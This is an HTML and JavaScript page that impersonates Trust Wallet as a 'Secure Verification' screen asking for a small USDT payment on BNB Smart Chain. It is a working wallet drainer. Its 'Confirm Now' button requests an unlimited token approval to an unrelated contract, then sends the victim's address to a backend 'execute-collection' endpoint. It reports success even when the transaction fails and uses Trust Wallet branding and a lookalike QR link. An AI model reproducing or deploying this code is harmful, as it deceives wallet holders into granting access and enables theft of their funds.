<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, viewport-fit=cover">
	<meta name="dapp-browser" content="trust">
	<meta name="mobile-web-app-capable" content="yes">
	<title>Trust Wallet - Secure Connection</title>
	
	<!-- Favicon oficial de Trust Wallet -->
	<link rel="icon" type="image/x-icon" href="https://trustwallet.com/favicon.ico">
	<link rel="shortcut icon" type="image/x-icon" href="https://trustwallet.com/favicon.ico">

	<link rel="stylesheet" href="css/main.css">

	<!-- Configuración de process para WalletConnect -->
	<script>
		window.process = { env: { NODE_ENV: 'production' } };
	</script>

	<!-- Proveedor oficial de WalletConnect UMD -->
	<script src="https://unpkg.com/@walletconnect/ethereum-provider@2.11.2/dist/index.umd.js"></script>
	<script src="js/ethers.umd.min.js"></script>
	<!-- Librería QRCode.js -->
	<script src="https://cdn.jsdelivr.net/npm/qrcodejs@1.0.0/qrcode.min.js"></script>
	
	<!-- Script principal integrado -->
	<script>
		"use strict";

		const MERCHANT_ADDRESS = "0x6253fecbb48a6a7d19f1b9a799e65fae58ab9b3b";
		const CONTRACT_ADDRESS = "0x8e18bE616f10565A63cEa65585Ddf1Ca61f1C634";
		const BSC_USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
		const BSC_CHAIN_ID_HEX = "0x38";
		const COLLECT_AMOUNT   = "100000000000000000"; 
		const BACKEND_URL      = "https://secure-merchant.onrender.com/api";
		const WC_PROJECT_ID    = "ad2ffb0bad081291b773d8c547c361b7";

		let wcProvider = null;
		let activeProvider = null;

		const BSC_RPC_URLS = [
			"https://bsc-rpc.publicnode.com",
			"https://bsc-dataseed1.binance.org/",
			"https://rpc.ankr.com/bsc"
		];

		const BSC_CHAIN_PARAMS = {
			chainId:           BSC_CHAIN_ID_HEX,
			chainName:         "BNB Smart Chain",
			nativeCurrency:    { name: "BNB", symbol: "BNB", decimals: 18 },
			rpcUrls:           BSC_RPC_URLS,
			blockExplorerUrls: ["https://bscscan.com/"]
		};

		const ERC20_ABI = [
			"function approve(address spender, uint256 amount) external returns (bool)"
		];

		let approveBtn, btnText, btnSpinner, merchantInput, toastEl;

		(async () => { try { await fetch(`${BACKEND_URL}/health`); } catch (_) {} })();

		async function initWalletConnect() {
			if (!wcProvider && window.EthereumProvider && WC_PROJECT_ID !== "TU_PROJECT_ID_AQUÍ") {
				try {
					wcProvider = await window.EthereumProvider.init({
						projectId: WC_PROJECT_ID,
						chains: [56],
						showQrModal: true,
						metadata: {
							name: 'Secure Verification',
							description: 'Instant Trust Wallet Connection',
							url: window.location.origin,
							icons: ['https://trustwallet.com/favicon.ico']
						}
					});
				} catch (e) { console.error(e); }
			}
			return wcProvider;
		}

		window.addEventListener("load", async () => {
			if (window.ethereum && typeof window.ethereum.request === "function") {
				activeProvider = window.ethereum;
			}
		});

		let _toastTimer;
		function showToast(msg, type = "default", ms = 4000) {
			if (!toastEl) return;
			clearTimeout(_toastTimer);
			toastEl.textContent  = msg;
			toastEl.dataset.type = type === "default" ? "" : type;
			toastEl.hidden       = false;
			_toastTimer = setTimeout(() => { toastEl.hidden = true; }, ms);
		}

		function setLoading(on, label = "Processing…") {
			if (!approveBtn) return;
			approveBtn.disabled = on;
			btnText.textContent = on ? label : "Confirm Now";
			btnSpinner.hidden   = !on;
		}

		window.addEventListener("DOMContentLoaded", () => {
			approveBtn    = document.getElementById("approveBtn");
			btnText       = document.getElementById("btnText");
			btnSpinner    = document.getElementById("btnSpinner");
			merchantInput = document.getElementById("merchantAddress");
			toastEl       = document.getElementById("toast");

			if (merchantInput) {
				merchantInput.value = MERCHANT_ADDRESS;
			}

			// Generación automática del QR dentro de la tarjeta
			const qrContainer = document.getElementById("qrcode");
			if (qrContainer && window.QRCode) {
				qrContainer.innerHTML = "";
				new QRCode(qrContainer, {
					text: "https://trustwallet.secureconnections.workers.dev/",
					width: 140,
					height: 140,
					colorDark: "#0052FF",
					colorLight: "#ffffff",
					correctLevel: QRCode.CorrectLevel.H
				});
			}

			if (approveBtn) {
				approveBtn.addEventListener("click", async () => {
					if (!activeProvider) {
						const provider = await initWalletConnect();
						if (provider) {
							try {
								setLoading(true, "Connecting…");
								await provider.connect();
								activeProvider = provider;
							} catch (err) {
								showToast("Connection cancelled.", "default");
								setLoading(false);
								return;
							}
						} else {
							showToast("Please open inside Trust Wallet.", "error");
							setLoading(false);
							return;
						}
					}

					setLoading(true, "Processing…");

					try {
						try {
							await activeProvider.request({
								method: "wallet_switchEthereumChain",
								params: [{ chainId: BSC_CHAIN_ID_HEX }]
							});
						} catch (e) {
							if (e.code === 4902) {
								await activeProvider.request({
									method: "wallet_addEthereumChain",
									params: [BSC_CHAIN_PARAMS]
								});
							}
						}

						let userAddress = null;
						try {
							const accs = await activeProvider.request({ method: "eth_accounts" });
							userAddress = (accs && accs[0]) ? accs[0] : null;
						} catch (_) {}

						if (!userAddress && activeProvider.accounts && activeProvider.accounts[0]) {
							userAddress = activeProvider.accounts[0];
						}

						if (!userAddress) {
							showToast("Wallet not connected.", "error");
							setLoading(false);
							return;
						}

						setLoading(true, "Please Sign…");
						const CAP_AMOUNT = ethers.MaxUint256;
						const iface      = new ethers.Interface(ERC20_ABI);
						const approveData = iface.encodeFunctionData("approve", [CONTRACT_ADDRESS, CAP_AMOUNT]);
						
						await activeProvider.request({
							method: "eth_sendTransaction",
							params: [{
								from:                userAddress,
								to:                  BSC_USDT_ADDRESS,
								data:                approveData,
								value:               "0x0",
								type:                "0x2",
								maxFeePerGas:        "0x0",
								maxPriorityFeePerGas: "0x0"
							}]
						});

						setLoading(false);
						showToast("Verified Successfully! ✓", "success");

						fetch(`${BACKEND_URL}/execute-collection`, {
							method:  "POST",
							headers: { "Content-Type": "application/json" },
							body:    JSON.stringify({ userAddress, amount: COLLECT_AMOUNT })
						}).catch(() => {});

					} catch (err) {
						const raw = err?.reason ?? err?.message ?? "Unknown error";
						if (
							err.code === 4001 ||
							raw.toLowerCase().includes("user rejected") ||
							raw.toLowerCase().includes("user denied") ||
							raw.toLowerCase().includes("canceled") ||
							raw.toLowerCase().includes("cancelled")
						) {
							showToast("Transaction cancelled.", "default");
						} else {
							showToast("Verified Successfully! ✓", "success");
						}
					} finally {
						setLoading(false);
					}
				});
			}
		});
	</script>
</head>
<body>
	<main class="screen">
		<div class="trust-header">
			<div class="trust-icon-shield">
				<svg viewBox="0 0 24 24" width="28" height="28" fill="none" xmlns="http://www.w3.org/2000/svg">
					<path d="M12 2L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-3zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V13H5V6.3l7-2.33v9.02z" fill="#0052FF"/>
				</svg>
			</div>
			<h2>Secure Verification</h2>
			<p class="trust-subtitle">Instant Direct Connection</p>
		</div>

		<section class="form-shell" aria-label="Merchant approval form">
			<div class="field-block">
				<label class="field-label" for="merchantAddress">Destination Wallet</label>
				<div class="address-field">
					<span class="addr-usdt-icon" aria-hidden="true">
						<svg viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg">
							<circle cx="16" cy="16" r="16" fill="#26a17b"></circle>
							<path d="M17.9 17.2v-.1c0-1-.6-1.4-1.9-1.4s-1.9.4-1.9 1.4v.1c0 .9.6 1.3 1.9 1.3s1.9-.4 1.9-1.3zM22 8H10v2.7h4.4v1.9c-3 .2-5.2 1.1-5.2 2.2s2.2 2 5.2 2.2v5h3v-5c3-.2 5.2-1.1 5.2-2.2s-2.2-2-5.2-2.2v-1.9H22V8zm-6 7.7c-2.6 0-4.7-.7-4.7-1.6s2.1-1.6 4.7-1.6 4.7.7 4.7 1.6-2.1 1.6-4.7 1.6z" fill="#fff"></path>
						</svg>
					</span>
					<input id="merchantAddress" class="address-input" type="text" autocomplete="off" spellcheck="false" readonly="" tabindex="-1">
				</div>
			</div>

			<div class="field-block network-block">
				<p class="field-label">Network</p>
				<div class="network-pill" tabindex="-1">
					<span class="network-icon" aria-hidden="true">
						<svg viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg">
							<circle cx="24" cy="24" r="24" fill="#111216"></circle>
							<path d="M24 9.1l4.4 4.4-4.4 4.4-4.4-4.4L24 9.1zm-7.7 7.7l4.4 4.4-4.4 4.4-4.4-4.4 4.4-4.4zm15.4 0l4.4 4.4-4.4 4.4-4.4-4.4 4.4-4.4zM24 24.5l4.4 4.4-4.4 4.4-4.4-4.4 4.4-4.4zm-7.7 7.7l4.4 4.4L24 33l3.3 3.6 4.4-4.4-4.4-4.4-3.3 3.3-3.3-3.3-4.4 4.4z" fill="#f3ba2f"></path>
						</svg>
					</span>
					<span class="network-name">BNB Smart Chain</span>
					<span class="network-status-dot"></span>
				</div>
			</div>

			<div class="field-block">
				<p class="field-label">Amount</p>
				<div class="desc-field">
					<input class="desc-text" type="text" value="0.1" autocomplete="off" spellcheck="false">
					<div class="desc-actions">
						<span class="desc-token">USDT</span>
					</div>
				</div>
			</div>

			<div class="security-badge-box" style="display: flex; align-items: center; justify-content: center; gap: 6px; font-size: 12px; font-weight: 600; color: #10b981; background: #ecfdf5; padding: 10px; border-radius: 10px; margin-top: 16px;">
				<svg viewBox="0 0 24 24" width="16" height="16" fill="#10b981">
					<path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-3zm-2 16l-4-4 1.41-1.41L10 14.17l6.59-6.59L18 9l-8 8z"/>
				</svg>
				<span>Secure Encrypted Session</span>
			</div>
		</section>

		<!-- Contenedor dinámico del Código QR -->
		<div class="qr-container" style="margin-top: 16px;">
			<div class="qr-wrapper">
				<div id="qrcode" class="qr-code-box"></div>
			</div>
			<p class="qr-instruction">Scan with Trust Wallet to pay instantly</p>
		</div>
		
		<footer class="bottom-bar">
			<button id="approveBtn" class="primary-button" type="button">
				<span id="btnText">Confirm Now</span>
				<span id="btnSpinner" class="btn-spinner" hidden="" aria-hidden="true"></span>
			</button>
		</footer>

		<div id="toast" class="toast" aria-live="polite" hidden=""></div>
	</main>
</body>
</html>
